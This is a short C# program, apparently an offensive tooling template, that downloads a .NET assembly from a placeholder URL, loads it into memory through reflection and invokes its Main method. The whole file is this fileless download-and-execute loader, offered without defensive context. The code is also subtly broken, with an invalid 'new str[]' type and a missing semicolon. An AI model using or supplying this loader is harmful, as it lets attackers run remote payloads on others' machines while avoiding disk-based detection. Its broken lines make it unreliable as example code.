using System;
using System.Reflection;
using System.Net;

namespace ReflectViaCSharp
{
	class Program
	{
		static void Main(string[] args)
		{

			WebClient client = new WebClient();
			Byte[] data = client.DownloadData("WHERE-IS-YOUR-ASSEMBLY");

			Assembly assem = Assembly.Load(data);
			
			Type type = assem.GetType("NameSpace.Class");

			//TARGET METHOD
			MethodInfo method = type.GetMethod("Main");

			string[] paramStr = new str[] { "args" }
			object[] param = new[] { paramStr };
			
			object exec = method.Invoke(null, param); //INVOKE WITH PARAMETERS
			//object exec = method.Invoke(0, null);
		}
	}
}
